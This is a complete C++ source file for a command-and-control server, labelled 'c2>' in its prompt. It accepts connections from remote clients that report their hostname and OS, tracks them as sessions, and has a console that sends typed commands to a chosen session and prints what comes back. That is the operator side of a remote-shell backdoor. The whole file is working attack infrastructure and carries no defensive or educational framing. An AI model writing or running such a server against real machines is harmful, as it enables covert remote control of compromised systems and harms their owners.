#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <chrono>
#include <cstdint>
#include <iostream>
#include <memory>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

namespace {

struct Session {
    int id{};
    int fd{-1};
    std::string addr;
    std::string hostname;
    std::string os;
    std::mutex io_mutex;

    Session(int id, int fd, std::string addr, std::string hostname, std::string os)
        : id(id),
          fd(fd),
          addr(std::move(addr)),
          hostname(std::move(hostname)),
          os(std::move(os)) {}
};

struct SessionInfo {
    int id{};
    std::string addr;
    std::string hostname;
    std::string os;
};

class Manager {
public:
    int add(int fd, std::string addr, std::string hostname, std::string os) {
        std::lock_guard lock(mutex_);
        const int id = next_id_++;
        sessions_.push_back(
            std::make_shared<Session>(id, fd, std::move(addr), std::move(hostname), std::move(os)));
        return id;
    }

    void remove(int id) {
        std::lock_guard lock(mutex_);
        for (auto it = sessions_.begin(); it != sessions_.end(); ++it) {
            if ((*it)->id == id) {
                if ((*it)->fd >= 0)
                    ::close((*it)->fd);
                (*it)->fd = -1;
                sessions_.erase(it);
                return;
            }
        }
    }

    std::vector<SessionInfo> snapshot() {
        std::lock_guard lock(mutex_);
        std::vector<SessionInfo> copy;
        copy.reserve(sessions_.size());
        for (const auto& s : sessions_) {
            if (s->fd >= 0)
                copy.push_back({s->id, s->addr, s->hostname, s->os});
        }
        return copy;
    }

    std::shared_ptr<Session> find(int id) {
        std::lock_guard lock(mutex_);
        for (const auto& s : sessions_) {
            if (s->id == id && s->fd >= 0)
                return s;
        }
        return nullptr;
    }

private:
    std::mutex mutex_;
    std::vector<std::shared_ptr<Session>> sessions_;
    int next_id_{1};
};

std::atomic<bool> g_running{true};
Manager g_manager;

bool recv_until_null(int fd, std::string& out) {
    out.clear();
    char c = 0;
    while (true) {
        const ssize_t n = ::recv(fd, &c, 1, 0);
        if (n <= 0)
            return false;
        if (c == '\0')
            return true;
        out.push_back(c);
    }
}

bool send_command(int fd, std::mutex& io_mutex, const std::string& cmd, std::string& out) {
    std::lock_guard lock(io_mutex);
    std::string payload = cmd;
    if (payload.empty() || payload.back() != '\n')
        payload.push_back('\n');
    if (::send(fd, payload.data(), payload.size(), 0) <= 0)
        return false;
    return recv_until_null(fd, out);
}

void monitor_session(int id) {
    while (g_running) {
        const auto session = g_manager.find(id);
        if (!session)
            break;

        char c = 0;
        const ssize_t n = ::recv(session->fd, &c, 1, MSG_PEEK | MSG_DONTWAIT);
        if (n == 0) {
            std::cout << "\n[-] session " << id << " disconnected\n";
            g_manager.remove(id);
            break;
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void handle_client(int fd, std::string peer) {
    std::string meta;
    if (!recv_until_null(fd, meta)) {
        ::close(fd);
        return;
    }

    std::string hostname = "unknown";
    std::string os = "unknown";
    const auto sep = meta.find('|');
    if (sep != std::string::npos) {
        hostname = meta.substr(0, sep);
        os = meta.substr(sep + 1);
    }

    const int id = g_manager.add(fd, peer, hostname, os);
    std::cout << "[+] session " << id << " (" << peer << ")\n";
    std::thread(monitor_session, id).detach();
}

std::vector<std::string> split(const std::string& line) {
    std::istringstream iss(line);
    std::vector<std::string> parts;
    std::string part;
    while (iss >> part)
        parts.push_back(part);
    return parts;
}

std::string col(const std::string& value, std::size_t width) {
    if (value.size() >= width)
        return value.substr(0, width - 1) + " ";
    return value + std::string(width - value.size(), ' ');
}

void print_sessions() {
    const auto sessions = g_manager.snapshot();
    if (sessions.empty()) {
        std::cout << "no sessions\n";
        return;
    }

    constexpr std::size_t w_id = 4;
    constexpr std::size_t w_addr = 22;
    constexpr std::size_t w_host = 16;
    constexpr std::size_t w_os = 14;

    std::cout << "+----+";
    std::cout << std::string(w_addr, '-') << "+";
    std::cout << std::string(w_host, '-') << "+";
    std::cout << std::string(w_os, '-') << "+\n";

    std::cout << "| ID |" << col("Address", w_addr) << "|" << col("Hostname", w_host) << "|"
              << col("OS", w_os) << "|\n";

    std::cout << "+----+";
    std::cout << std::string(w_addr, '-') << "+";
    std::cout << std::string(w_host, '-') << "+";
    std::cout << std::string(w_os, '-') << "+\n";

    for (const auto& s : sessions) {
        std::cout << "| " << col(std::to_string(s.id), w_id - 1) << "|" << col(s.addr, w_addr) << "|"
                  << col(s.hostname, w_host) << "|" << col(s.os, w_os) << "|\n";
    }

    std::cout << "+----+";
    std::cout << std::string(w_addr, '-') << "+";
    std::cout << std::string(w_host, '-') << "+";
    std::cout << std::string(w_os, '-') << "+\n";
}

void print_help() {
    std::cout << "sessions              list sessions\n";
    std::cout << "console <session_id>  interact with session\n";
    std::cout << "help                  show this help\n";
    std::cout << "exit                  quit server\n";
}

void console_mode(int id) {
    auto session = g_manager.find(id);
    if (!session) {
        std::cout << "session not found\n";
        return;
    }

    std::cout << "console " << id << " (" << session->addr << ")\n";
    std::cout << "type 'back' to return\n";

    std::string line;
    while (g_running) {
        session = g_manager.find(id);
        if (!session) {
            std::cout << "session closed\n";
            return;
        }

        std::cout << "[" << id << "]> " << std::flush;
        if (!std::getline(std::cin, line))
            return;

        if (line == "back")
            return;

        std::string out;
        if (!send_command(session->fd, session->io_mutex, line, out)) {
            std::cout << "session closed\n";
            g_manager.remove(id);
            return;
        }

        std::cout << out << std::flush;
    }
}

void cli_loop() {
    print_help();
    std::string line;

    while (g_running) {
        std::cout << "c2> " << std::flush;
        if (!std::getline(std::cin, line))
            break;

        const auto parts = split(line);
        if (parts.empty())
            continue;

        if (parts[0] == "sessions") {
            print_sessions();
        } else if (parts[0] == "console") {
            if (parts.size() != 2) {
                std::cout << "usage: console <session_id>\n";
                continue;
            }
            try {
                console_mode(std::stoi(parts[1]));
            } catch (...) {
                std::cout << "invalid session id\n";
            }
        } else if (parts[0] == "help") {
            print_help();
        } else if (parts[0] == "exit") {
            g_running = false;
        } else {
            std::cout << "unknown command\n";
        }
    }
}

void accept_loop(std::uint16_t port) {
    const int listener = ::socket(AF_INET, SOCK_STREAM, 0);
    if (listener < 0)
        return;

    const int opt = 1;
    ::setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (::bind(listener, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0)
        return;
    if (::listen(listener, SOMAXCONN) < 0)
        return;

    while (g_running) {
        sockaddr_in client_addr{};
        socklen_t len = sizeof(client_addr);
        const int client = ::accept(listener, reinterpret_cast<sockaddr*>(&client_addr), &len);
        if (client < 0)
            continue;

        char peer[INET_ADDRSTRLEN]{};
        ::inet_ntop(AF_INET, &client_addr.sin_addr, peer, sizeof(peer));
        const std::string peer_addr =
            std::string(peer) + ":" + std::to_string(ntohs(client_addr.sin_port));

        std::thread(handle_client, client, peer_addr).detach();
    }

    ::close(listener);
}

} 

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "usage: " << argv[0] << " <port>\n";
        return 1;
    }

    std::uint16_t port = 0;
    try {
        const unsigned long value = std::stoul(argv[1]);
        if (value == 0 || value > 65535)
            throw std::out_of_range("port");
        port = static_cast<std::uint16_t>(value);
    } catch (...) {
        std::cerr << "invalid port\n";
        return 1;
    }

    std::cout << "listening on " << port << '\n';
    std::thread(accept_loop, port).detach();
    cli_loop();
    return 0;
}
